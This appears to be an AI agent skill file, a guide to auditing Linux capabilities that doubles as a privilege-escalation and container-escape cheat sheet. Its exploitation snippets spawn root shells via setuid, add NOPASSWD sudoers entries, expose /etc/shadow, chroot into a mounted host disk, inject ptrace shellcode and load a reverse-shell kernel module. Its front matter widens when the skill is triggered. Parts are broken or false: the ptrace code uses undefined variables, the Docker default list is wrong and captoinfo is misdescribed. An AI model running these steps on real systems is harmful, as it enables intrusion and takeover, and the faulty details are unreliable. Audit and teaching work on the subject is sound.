---
name: linux-capabilities
description: Linux capabilities security auditing and privilege escalation guide. Use this skill whenever the user asks about Linux capabilities, capability-based privilege escalation, container escapes, security auditing of Linux systems, or needs to understand how to check/modify capabilities on processes and binaries. Make sure to use this skill for any Linux security assessment involving capabilities, even if the user doesn't explicitly mention 'capabilities' but asks about privilege escalation, container breakout, or permission bypass techniques.
---

# Linux Capabilities Security Guide

A comprehensive skill for auditing, understanding, and working with Linux capabilities for security assessments and privilege escalation scenarios.

## When to Use This Skill

Use this skill when:
- Auditing Linux systems for capability-based security issues
- Investigating privilege escalation vectors
- Analyzing container escape possibilities
- Checking what capabilities processes or binaries have
- Understanding how to modify or exploit capabilities
- Security assessments involving Linux permission systems

## Quick Reference Commands

### Check Process Capabilities

```bash
# Current process
cat /proc/self/status | grep Cap

# Specific process by PID
cat /proc/<PID>/status | grep Cap

# Using capsh
capsh --print

# Using getpcaps
getpcaps <PID>
```

### Check Binary Capabilities

```bash
# Single binary
getcap /path/to/binary

# Search entire filesystem
getcap -r / 2>/dev/null

# Search specific directory
getcap -r /usr/bin 2>/dev/null
```

### Decode Capability Hex Values

```bash
capsh --decode=0000003fffffffff
```

### Modify Binary Capabilities

```bash
# Add capabilities
setcap cap_net_raw,cap_net_admin+ep /usr/sbin/tcpdump

# Remove all capabilities
setcap -r /path/to/binary

# Remove specific capability
setcap -r cap_net_raw /path/to/binary
```

## Capability Sets Explained

### 1. Inherited (CapInh)
- **Purpose**: Capabilities passed from parent to child processes
- **Use case**: Maintaining privileges across process spawns
- **Restriction**: Cannot gain capabilities parent didn't have

### 2. Effective (CapEff)
- **Purpose**: Capabilities currently in use by the process
- **Significance**: Kernel checks this set for permission decisions
- **Key point**: This is what actually grants privileges

### 3. Permitted (CapPrm)
- **Purpose**: Maximum capabilities a process can have
- **Functionality**: Can elevate from permitted to effective
- **Boundary**: Upper limit for process privileges

### 4. Bounding (CapBnd)
- **Purpose**: Ceiling on all capabilities a process can ever acquire
- **Security**: Extra layer preventing privilege escalation
- **Use case**: Restricting process privilege potential

### 5. Ambient (CapAmb)
- **Purpose**: Preserve capabilities across execve calls
- **Functionality**: Non-SUID programs can retain privileges
- **Restriction**: Subject to inheritable and permitted sets

## Critical Capabilities for Security Audits

### CAP_SYS_ADMIN
**Risk Level: CRITICAL**

Near-root level capability with extensive administrative privileges.

**What it allows:**
- Mount devices and filesystems
- Manipulate kernel features
- Container escape via mount namespace abuse

**Exploitation example:**
```bash
# Check if binary has CAP_SYS_ADMIN
getcap -r / 2>/dev/null | grep sys_admin

# Mount host disk from container
fdisk -l
mount /dev/sda /mnt/
chroot /mnt/ bash

# Python mount example
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
libc.mount(b"/path/to/fake/passwd", b"/etc/passwd", b"none", MS_BIND, b"rw")
```

**Mitigation:** Drop this capability in containers unless absolutely necessary.

### CAP_SYS_PTRACE
**Risk Level: CRITICAL**

Allows process debugging and memory manipulation.

**What it allows:**
- Attach to and debug any process
- Read/write process memory
- Inject shellcode into running processes
- Bypass seccomp filters

**Exploitation example:**
```bash
# Check for ptrace capability
getcap -r / 2>/dev/null | grep ptrace

# Python ptrace injection
import ctypes
import sys

libc = ctypes.CDLL("libc.so.6")
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_POKETEXT = 4

# Attach to process
libc.ptrace(PTRACE_ATTACH, pid, None, None)

# Inject shellcode
shellcode = b"\x48\x31\xc0..."
for i in range(0, len(shellcode), 4):
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(rip+i), shellcode_byte)

# Detach
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**Mitigation:** Use seccomp filters on ptrace(2) calls.

### CAP_SYS_MODULE
**Risk Level: CRITICAL**

Allows loading/unloading kernel modules.

**What it allows:**
- Load malicious kernel modules
- Bypass all Linux security mechanisms
- Total system compromise

**Exploitation example:**
```bash
# Check for module capability
getcap -r / 2>/dev/null | grep sys_module

# Load reverse shell module
insmod reverse-shell.ko

# Python kmod example
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/")
km.modprobe("reverse-shell")
```

**Mitigation:** Never grant this capability in containers.

### CAP_DAC_READ_SEARCH
**Risk Level: HIGH**

Bypasses file read permission checks.

**What it allows:**
- Read any file regardless of permissions
- Access files outside mount namespace
- Container breakout via open_by_handle_at

**Exploitation example:**
```bash
# Check for DAC_READ_SEARCH
getcap -r / 2>/dev/null | grep dac_read_search

# Read shadow file with tar
cd /etc
tar -czf /tmp/shadow.tar.gz shadow
cd /tmp
tar -xzf shadow.tar.gz

# Python file read
print(open("/etc/shadow", "r").read())
```

### CAP_DAC_OVERRIDE
**Risk Level: HIGH**

Bypasses file write permission checks.

**What it allows:**
- Write to any file
- Modify /etc/passwd, /etc/shadow, /etc/sudoers
- Privilege escalation via file overwrites

**Exploitation example:**
```bash
# Check for DAC_OVERRIDE
getcap -r / 2>/dev/null | grep dac_override

# Modify sudoers
vim /etc/sudoers

# Python file write
file = open("/etc/sudoers", "a")
file.write("youruser ALL=(ALL) NOPASSWD:ALL")
file.close()
```

### CAP_SETUID / CAP_SETGID
**Risk Level: HIGH**

Allows setting effective user/group ID.

**What it allows:**
- Switch to root (UID 0)
- Impersonate any user or group
- Direct privilege escalation

**Exploitation example:**
```bash
# Check for SETUID/SETGID
getcap -r / 2>/dev/null | grep -E "setuid|setgid"

# Python privilege escalation
import os
os.setuid(0)
os.system("/bin/bash")

# Set group ID
os.setgid(42)  # shadow group
os.system("cat /etc/shadow")
```

### CAP_NET_RAW + CAP_NET_ADMIN
**Risk Level: MEDIUM**

Network manipulation capabilities.

**What it allows:**
- Create raw sockets
- Sniff network traffic
- Modify firewall rules
- Enable promiscuous mode

**Exploitation example:**
```bash
# Check for network capabilities
getcap -r / 2>/dev/null | grep -E "net_raw|net_admin"

# Python packet sniffing
import socket
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.bind(("lo", 0x0003))
while True:
    frame = s.recv(4096)
    # Process packet

# Flush iptables
import iptc
iptc.easy.flush_table('filter')
```

### CAP_CHOWN / CAP_FOWNER
**Risk Level: MEDIUM**

File ownership and permission modification.

**What it allows:**
- Change file ownership
- Modify file permissions
- Escalate via permission changes

**Exploitation example:**
```bash
# Check for CHOWN/FOWNER
getcap -r / 2>/dev/null | grep -E "chown|fowner"

# Python chown
import os
os.chown("/etc/shadow", 1000, 1000)

# Python chmod
os.chmod("/etc/shadow", 0o666)
```

### CAP_SETFCAP
**Risk Level: HIGH**

Set capabilities on files and processes.

**What it allows:**
- Grant capabilities to other binaries
- Chain capability exploits
- Escalate to other dangerous capabilities

**Exploitation example:**
```bash
# Check for SETFCAP
getcap -r / 2>/dev/null | grep setfcap

# Python capability setting
import ctypes
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")
libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p, ctypes.c_void_p]

cap = 'cap_setuid+ep'
cap_t = libcap.cap_from_text(cap.encode())
libcap.cap_set_file(b"/usr/bin/python", cap_t)
```

## Docker Container Capability Auditing

### Check Container Capabilities

```bash
# Inside container
capsh --print

# Check specific process
cat /proc/`pidof bash`/status | grep Cap

# Decode capability hex
capsh --decode=<hex_value>
```

### Default Docker Capabilities

Docker containers typically have these capabilities by default:
- CAP_CHOWN
- CAP_DAC_OVERRIDE
- CAP_DAC_READ_SEARCH
- CAP_FOWNER
- CAP_FSETID
- CAP_KILL
- CAP_SETGID
- CAP_SETUID
- CAP_SETPCAP
- CAP_NET_BIND_SERVICE
- CAP_NET_RAW
- CAP_SYS_CHROOT
- CAP_MKNOD
- CAP_AUDIT_WRITE
- CAP_SETFCAP

### Add/Remove Capabilities in Docker

```bash
# Add capability
docker run --cap-add=SYS_ADMIN image

# Add all capabilities
docker run --cap-add=ALL image

# Remove all, add specific
docker run --cap-drop=ALL --cap-add=SYS_PTRACE image

# Remove specific
docker run --cap-drop=SYS_ADMIN image
```

## Security Audit Checklist

### 1. Identify Binaries with Capabilities

```bash
# Full system scan
getcap -r / 2>/dev/null > /tmp/capabilities.txt

# Check critical directories
getcap -r /usr/bin 2>/dev/null
getcap -r /usr/sbin 2>/dev/null
getcap -r /bin 2>/dev/null
getcap -r /sbin 2>/dev/null
```

### 2. Check Running Processes

```bash
# All processes with capabilities
for pid in /proc/[0-9]*/status; do
    grep -q "CapEff: 0000000000000000" "$pid" || echo "$pid"
done

# Specific process
cat /proc/<PID>/status | grep Cap
```

### 3. Analyze Capability Sets

```bash
# Decode and analyze
capsh --decode=<hex_value>

# Check for dangerous combinations
capsh --print | grep -E "sys_admin|sys_ptrace|sys_module"
```

### 4. Test Capability Exploitation

```bash
# Test SETUID escalation
python3 -c 'import os; os.setuid(0); os.system("id")'

# Test DAC_OVERRIDE
python3 -c 'print(open("/etc/shadow").read())'

# Test NET_RAW
python3 -c 'import socket; s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))'
```

## Mitigation Strategies

### For System Administrators

1. **Principle of Least Privilege**: Only grant necessary capabilities
2. **Regular Audits**: Periodically scan for binaries with capabilities
3. **Container Hardening**: Drop unnecessary capabilities in containers
4. **File Integrity**: Monitor changes to capability settings
5. **SELinux/AppArmor**: Use mandatory access controls

### For Container Security

```bash
# Recommended container capability policy
[Service]
User=appuser
AmbientCapabilities=CAP_NET_BIND_SERVICE
CapabilityBoundingSet=CAP_NET_BIND_SERVICE
NoNewPrivileges=true
```

### For Application Developers

1. **Drop capabilities early**: Remove unnecessary capabilities at startup
2. **Use capability-aware libraries**: Implement proper capability handling
3. **Validate inputs**: Prevent capability abuse through input validation
4. **Run as non-root**: Avoid running with full root privileges

## Common Exploitation Patterns

### Pattern 1: Binary with SETUID

```bash
# Find binaries with SETUID capability
getcap -r / 2>/dev/null | grep setuid

# Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Pattern 2: Container with SYS_ADMIN

```bash
# Check capability
capsh --print | grep sys_admin

# Mount host filesystem
mount /dev/sda /mnt/
chroot /mnt/ bash
```

### Pattern 3: Binary with DAC_OVERRIDE

```bash
# Find binaries
getcap -r / 2>/dev/null | grep dac_override

# Modify sudoers
vim /etc/sudoers
# Add: youruser ALL=(ALL) NOPASSWD:ALL
```

### Pattern 4: Combined Capability Chain

```python
# SETGID + CHOWN chain
import os

os.setgid(42)  # shadow group
os.chown("/etc/shadow", 1000, 42)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

## Tools and Resources

### Essential Tools

- `capsh` - Capability shell and decoder
- `getcap` - Query file capabilities
- `setcap` - Set file capabilities
- `getpcaps` - Query process capabilities
- `captoinfo` - Convert capabilities to info format

### Useful Commands

```bash
# List all capabilities
capsh --decode=0000003fffffffff

# Check current process capabilities
cat /proc/self/status | grep Cap

# Find all binaries with capabilities
getcap -r / 2>/dev/null

# Drop specific capability
capsh --drop=cap_net_raw -- -c "command"
```

### External Resources

- [Linux Capabilities Man Page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Linux Audit - Capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [Container-Solutions Blog](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [Pentester Academy Labs](https://attackdefense.pentesteracademy.com/)

## Safety Warnings

⚠️ **Important Security Considerations:**

1. **Legal Use Only**: Only test on systems you own or have explicit permission to audit
2. **Backup First**: Always backup critical files before testing capability modifications
3. **Understand Impact**: Some capability exploits can permanently damage systems
4. **Document Everything**: Keep records of all changes made during security assessments
5. **Revert Changes**: Remove test capabilities after security assessments

## Quick Start Guide

### For Security Auditors

1. Run `getcap -r / 2>/dev/null` to find binaries with capabilities
2. Check running processes with `cat /proc/<PID>/status | grep Cap`
3. Identify dangerous capabilities (SYS_ADMIN, SYS_PTRACE, SYS_MODULE)
4. Test exploitation vectors in controlled environment
5. Document findings and recommend mitigations

### For System Administrators

1. Audit existing capabilities regularly
2. Remove unnecessary capabilities from binaries
3. Harden container configurations
4. Implement monitoring for capability changes
5. Train staff on capability security

### For Developers

1. Design applications to drop capabilities early
2. Use capability-aware programming patterns
3. Test applications with minimal capabilities
4. Document required capabilities
5. Follow principle of least privilege

## Troubleshooting

### Common Issues

**Issue**: `getcap` not found
```bash
# Install libcap2-bin
apt install libcap2-bin  # Debian/Ubuntu
yum install libcap       # RHEL/CentOS
```

**Issue**: Cannot modify capabilities
```bash
# Need root or CAP_SETFCAP
sudo setcap cap_net_raw+ep /usr/bin/ping
```

**Issue**: Capability not taking effect
```bash
# Check bounding set
cat /proc/self/status | grep CapBnd
# May need to adjust bounding set
```

**Issue**: Container capability restrictions
```bash
# Check container security options
docker inspect <container> | grep -A 20 HostConfig
# May need to adjust docker run options
```

## Next Steps

After using this skill:

1. **Document findings**: Record all capabilities discovered and their risk levels
2. **Prioritize remediation**: Address critical capabilities first (SYS_ADMIN, SYS_PTRACE, SYS_MODULE)
3. **Implement monitoring**: Set up alerts for capability changes
4. **Regular audits**: Schedule periodic capability assessments
5. **Update policies**: Revise security policies based on findings

---

**Remember**: Linux capabilities are a powerful security feature when used correctly, but can be dangerous when misconfigured. Always follow the principle of least privilege and regularly audit your systems.
